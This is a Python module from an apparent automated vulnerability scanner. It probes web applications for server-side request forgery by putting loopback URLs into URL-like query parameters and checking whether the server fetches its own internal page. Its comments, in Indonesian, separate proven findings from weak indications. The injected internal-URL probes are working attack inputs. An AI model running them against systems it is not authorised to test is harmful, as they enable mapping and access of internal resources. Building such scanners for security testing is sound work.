"""SSRF executor — URL param probe with safe placeholder."""

from __future__ import annotations

from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from wth_ai.executor.vuln.base import BaseVulnExecutor
from wth_ai.models import ExecutorResult, ExecutorTask

def _distinctive_marker(html: str) -> str:
    """Ambil potongan teks yang khas dari sebuah halaman untuk dijadikan penanda.

    Dipakai membuktikan pengambilan resource internal: kalau potongan ini muncul di
    respons endpoint yang kita probe, server memang mengambil halaman itu.
    """
    import re as _re

    for pattern in (r"<title[^>]*>([^<]{6,80})</title>", r"<h1[^>]*>([^<]{6,80})</h1>"):
        match = _re.search(pattern, html, _re.IGNORECASE)
        if match:
            text = match.group(1).strip()
            if text:
                return text
    stripped = " ".join(html.split())
    return stripped[:60] if len(stripped) >= 20 else ""


SSRF_MARKERS = ("url", "redirect", "next", "callback", "dest", "target", "uri", "link")
PROBE_URL = "http://127.0.0.1:1/wth-ssrf-probe"


class SsrfExecutor(BaseVulnExecutor):
    vuln_type = "ssrf"

    def execute(self, task: ExecutorTask) -> ExecutorResult:
        url = task.target
        if not url.startswith("http"):
            url = f"https://{url}"
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        target_param = next((p for p in params if p.lower() in SSRF_MARKERS), None)
        if not target_param:
            for p in params:
                if any(m in p.lower() for m in SSRF_MARKERS):
                    target_param = p
                    break

        if not target_param:
            return self._result(
                task, status="success",
                summary=f"No URL-like param found in {url[:80]}",
                evidence=[], observations=["Try a URL with ?url= or ?redirect= param"],
                risk="low",
            )

        mutated = dict(params)
        mutated[target_param] = [PROBE_URL]
        new_query = urlencode(mutated, doseq=True)
        probe_url = urlunparse(parsed._replace(query=new_query))

        role = self.sessions.role_names()[0] if self.sessions.configured() else "user_a"
        if not self.sessions.configured():
            import requests
            try:
                r = requests.get(probe_url, timeout=10, allow_redirects=False)
                resp = {"status": r.status_code, "body": r.text[:5000], "headers": dict(r.headers)}
            except Exception as exc:
                resp = {"error": str(exc), "status": 0, "body": ""}
        else:
            resp = self.sessions.request(role, "GET", probe_url)

        evidence: list[str] = []
        observations = [f"status={resp.get('status')}", f"param={target_param}"]
        request_pairs = [{"method": "GET", "url": probe_url, "response_status": resp.get("status"),
                          "body_snippet": resp.get("body", "")[:500]}]

        # ── BUKTI dari ISI, bukan dari error ────────────────────────────────
        # Versi sebelumnya hanya menyimpulkan dari 500 / "connection refused", dan
        # itu rapuh: aplikasi apa pun yang error pada URL buruk terlihat sama, dan
        # "connection refused" membuktikan percobaan koneksi, bukan akses.
        # Sekarang: ambil penanda unik dari halaman loopback milik target, minta
        # server mengambilnya lewat parameter, lalu cek penanda itu MUNCUL di
        # respons. Kalau muncul, server benar-benar mengambil resource internal.
        proof, proof_pair = self._prove_by_content(parsed, params, target_param)
        if proof:
            evidence.append(proof)
            if proof_pair:
                request_pairs.append(proof_pair)

        body = resp.get("body", "").lower()
        oob_hit = self._try_mcp_oob(task)
        if oob_hit:
            evidence.append(f"OOB callback via MCP: {oob_hit}")
        # Sinyal sekunder (lemah): tetap dilaporkan, tapi TIDAK sendirian dianggap
        # bukti kuat -- disebut apa adanya sebagai indikasi.
        if not proof:
            if resp.get("status") in {500, 502, 504}:
                evidence.append(f"Indikasi (lemah): server error saat diminta URL internal via {target_param}")
            if "connection refused" in body or "127.0.0.1" in body:
                evidence.append(f"Indikasi (lemah): error jaringan internal terefleksi untuk param {target_param}")
            if resp.get("headers", {}).get("Location", "").startswith("http://127"):
                evidence.append("Indikasi (lemah): redirect ke host internal terdeteksi")

        return self._result(
            task, status="success",
            summary=f"SSRF probe on {target_param} → {probe_url[:100]}",
            evidence=evidence,
            observations=observations,
            risk="high" if proof else ("medium" if evidence else "low"),
            request_pairs=request_pairs,
        )

    def _prove_by_content(self, parsed, params, target_param) -> tuple[str, dict | None]:
        """Ambil halaman loopback target, lalu buktikan server mengambilnya.

        Returns (bukti, request_pair). Bukti kosong bila tidak terbukti -- dan itu
        dilaporkan jujur sebagai indikasi lemah, bukan sebagai temuan.
        """
        import requests

        base = f"{parsed.scheme}://{parsed.netloc}"
        loopback = f"http://127.0.0.1:{parsed.port or (443 if parsed.scheme == 'https' else 80)}/"
        try:
            direct = requests.get(base + "/", timeout=8)
        except Exception:  # noqa: BLE001
            return "", None
        marker = _distinctive_marker(direct.text)
        if not marker:
            return "", None

        mutated = dict(params)
        mutated[target_param] = [loopback]
        probe_url = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
        try:
            r = requests.get(probe_url, timeout=10, allow_redirects=False)
        except Exception:  # noqa: BLE001
            return "", None
        if marker in r.text:
            pair = {"method": "GET", "url": probe_url, "response_status": r.status_code,
                    "body_snippet": r.text[:500]}
            return (
                f"TERBUKTI: isi halaman internal ({loopback}) muncul di respons via param "
                f"`{target_param}` — penanda {marker[:40]!r} ditemukan, server benar-benar "
                "mengambil URL loopback",
                pair,
            )
        return "", None

    def _try_mcp_oob(self, task: ExecutorTask) -> str:
        """Optional OOB SSRF check via MCP when enabled."""
        try:
            from wth_ai.mcp.client import MCPClient
            from wth_ai.config import WTHConfig
            mcp = MCPClient(WTHConfig.load())
            if mcp.available():
                result = mcp._oob_callback(session_id=task.id)
                if result.success:
                    return result.output[:200]
        except Exception:
            pass
        return ""
